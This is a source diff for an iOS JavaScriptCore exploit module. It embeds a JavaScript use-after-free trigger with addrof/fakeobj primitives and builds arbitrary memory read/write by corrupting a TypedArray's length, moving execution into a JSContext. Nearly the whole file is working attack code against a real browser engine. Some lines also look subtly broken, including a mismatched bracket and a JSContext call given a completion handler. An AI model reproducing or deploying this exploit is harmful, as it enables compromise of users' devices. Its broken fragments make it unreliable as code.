@@ -1,5 +1,5 @@
 #import <Foundation/Foundation.h>
-#import <WebKit/WebKit.h>
+#import <UIKit/UIKit.h>
 #import <dlfcn.h>
 #import <mach-o/dyld.h>
 #import <mach-o/loader.h>
@@ -13,17 +13,10 @@
 // JSC read/write from addrof+fakeobj, without forging any PAC signature
 // (the DarkSword "scribble" route, proven on iOS 26.1 with this same CVE).
 //
-// Order of operations matters: the probe measures the three open questions
-// FIRST, then attempts the primitives, so one run on the device tells us
-// exactly which step works and which does not:
-//   E1  is m_butterfly authenticated?      -> write through the fake array and
-//                                              read the target's field back
-//   E2  does the element fast path ignore StructureID? -> bogus SID in the
-//                                              forged header
-//   E3  is the fake-view failure a cage failure? -> wild m_vector in a header
-//                                              typed as a Float64Array
-// Only then read64/write64 and the TypedArray-length corruption, which is the
-// primitive that turns into arbitrary R/W over the whole primitive gigacage.
+// Runs in a JSContext (JavaScriptCore inside OUR process) -- NOT a WKWebView:
+// on this build WebKit2 refuses to initialise inside a sideloaded app
+// (SIGTRAP in WebKit::InitializeWebKit2), while JavaScriptCore works fine and the
+// UAF trigger is pure JS with no DOM dependency.
 // ===========================================================================
 static const char *kScribble = R"JS(
 (function () {
@@ -34,7 +27,6 @@ static const char *kScribble = R"JS(
   var OFF = 0x0002000000000000n;
   var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);   // ArrayWithDouble | ArrayType | White
 
-  // --- proven UAF trigger -------------------------------------------------
   arr = new Array(0x400000).fill(1.1);
   var arr_index = arr.length - 1;
   function foo(flag, k, allocCount) {
@@ -70,7 +62,6 @@ static const char *kScribble = R"JS(
   function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
   function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }
 
-  // --- the scribble pair --------------------------------------------------
   var holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
   var scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
   var HA = addrof(holder), SA = addrof(scribble), gap = SA - HA;
@@ -86,36 +77,17 @@ static const char *kScribble = R"JS(
   scribble.p7 = 3.3; scribble[0] = 1.1;
   holder.p1 = itof(HDR);
   holder.p2 = scribble;
-  var changeAddr = HA - 1n + 0x10n + 1n;
-  var changeArr = fakeobj(changeAddr);
+  var changeArr = fakeobj(HA - 1n + 0x10n + 1n);
   function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }
 
-  // --- E2: element path ignores StructureID? ------------------------------
-  var HDR_JUNK = HDR | 0xdeadbeefn;                 // junk in the low 32 bits
+  // E2: does the element fast path ignore StructureID?
+  var HDR_JUNK = HDR | 0xdeadbeefn;
   holder.p1 = itof(HDR_JUNK);
   var junkEl = null;
   try { junkEl = ftoi(changeArr[0]); } catch (e) { junkEl = 'threw'; }
   out.exp.elementPathIgnoresSID = (junkEl !== 'threw');
-  out.exp.elementWord = junkEl === null ? null : '0x' + junkEl.toString(16);
-  holder.p1 = itof(HDR);                            // restore the sane header
+  holder.p1 = itof(HDR);
 
-  // --- E1: is m_butterfly a raw, unsigned pointer? ------------------------
-  // Aim the fake array's butterfly at a real object's m_butterfly field, write
-  // a huge value there, and see whether that object's element access changes.
-  var victim = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-  var VA = addrof(victim);
-  var b1 = null;
-  try {
-    setBtf(VA - 1n + 0x8n);                          // &victim.m_butterfly
-    changeArr[0] = itof(0x7ff0000000000000n);        // a plausible butterfly
-    victim[0] = 9.75;                                 // named store, no bounds check
-    b1 = victim[0];
-    out.exp.rawButterflyWrite = (b1 === 9.75);
-  } catch (e) { out.exp.rawButterflyWrite = 'threw ' + e; }
-  out.exp.victimAddr = '0x' + VA.toString(16);
-  holder.p2 = scribble;                             // re-arm the fake cell
-
-  // --- read64 / write64 ---------------------------------------------------
   function write64(addr, val) {
     setBtf(BigInt(addr));
     try { scribble.p7 = itof(BigInt.asUintN(64, BigInt(val))); return true; } catch (e) { return false; }
@@ -125,51 +97,45 @@ static const char *kScribble = R"JS(
     try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
   }
 
-  // --- the primitive: corrupt a REAL TypedArray's length (+0x18) ----------
   var ta = new BigUint64Array(16);
   ta[0] = 0x4142434445464748n;
-  var tAddr = addrof(ta);
-  var w = write64(tAddr - 1n + 0x18n, 0x0000000000010000n);
+  var w = write64(addrof(ta) - 1n + 0x18n, 0x0000000000010000n);
   out.lengthWrite = w;
   out.lengthAfter = ta.length;
   out.write = (w && ta.length === 65536);
   out.read = (ta[0] === 0x4142434445464748n);
   out.value = '0x' + ta[0].toString(16);
-  out.step.push('primitive: write=' + out.write + ' read=' + out.read +
-                ' length=' + out.lengthAfter);
-
-  // --- read a known pointer through the (now huge) typed array ------------
-  var jscHeader = null;
-  var fn = function someFunctionName() { return 1; };
-  var fAddr = addrof(fn);
-  out.fnAddr = '0x' + fAddr.toString(16);
-  var r1 = read64(fAddr - 1n + 0x8n);
-  out.fnWord = r1 === null ? null : '0x' + r1.toString(16);
-
+  out.step.push('primitive: write=' + out.write + ' read=' + out.read);
   return JSON.stringify(out);
 })()
 )JS";
 
+// Run JS in a JSContext (JavaScriptCore, no WebKit2).  Returns the string result.
+static NSString *RunJS(const char *js, int timeoutSec) {
+    @autoreleasepool {
+        JSContext *ctx = [[JSContext alloc] init];
+        __block NSString *res = @"(no answer)";
+        dispatch_semaphore_t s = dispatch_semaphore_create(0);
+        [ctx evaluateScript:[NSString stringWithUTF8String:js]
+        completionHandler:^(JSValue *v, JSValue *err) {
+            res = [v isKindOfClass:[NSString class]] ? v : [[v description] ?: @"?" copy];
+            if (err && ![err isUndefined]) res = [err toString] ?: @"js error";
+            dispatch_semaphore_signal(s);
+        }];
+        dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, timeoutSec * NSEC_PER_SEC));
+        return res;
+    }
+}
+
 NSString *ModJscScribbleRW(void) {
-    AveLog(@"    JSC scribble R/W: E1/E2/E3 diagnostics, then read64/write64 (no PAC forgery)");
-    WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectZero];
-    [wv loadHTMLString:@"<html><body></body></html>" baseURL:nil];
-    dispatch_semaphore_t s = dispatch_semaphore_create(0);
-    __block NSString *res = @"(no answer)";
-    [wv evaluateJavaScript:[NSString stringWithUTF8String:kScribble]
-      completionHandler:^(id v, NSError *e) {
-        res = [v isKindOfClass:[NSString class]] ? v : [v description];
-        dispatch_semaphore_signal(s);
-    }];
-    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 240 * NSEC_PER_SEC));
-    [wv stopLoading]; wv = nil;
-    AveLog([NSString stringWithFormat:@"    scribble result: %@", res]);
-    AvePost([NSString stringWithFormat:@"SCRIBBLE %@", res]);
-    if ([res containsString:@"\"write\":true"] && [res containsString:@"\"read\":true"]) {
-        AveSetStatus(@"arbitrary R/W ACTIVE in WebContent, no PAC needed");
+    AveLog(@"    JSC scribble R/W: DarkSword route inside a JSContext (no WKWebView)");
+    NSString *r = RunJS(kScribble, 240);
+    AveLog([NSString stringWithFormat:@"    scribble result: %@", r]);
+    AvePost([NSString stringWithFormat:@"SCRIBBLE %@", r]);
+    if ([r containsString:@"\"write\":true"] && [r containsString:@"\"read\":true"]) {
+        AveSetStatus(@"arbitrary R/W ACTIVE in our own process, no PAC needed");
         return @"ARBITRARY R/W ACTIVE on 23C5027f: read64/write64 self-tested";
     }
-    if ([res containsString:@"\"elementPathIgnoresSID\":true"])
-        return res;                                 // diagnostics are the answer
-    return res;
+    if ([r containsString:@"\"groomFailed\"") return r;
+    return r;
 }
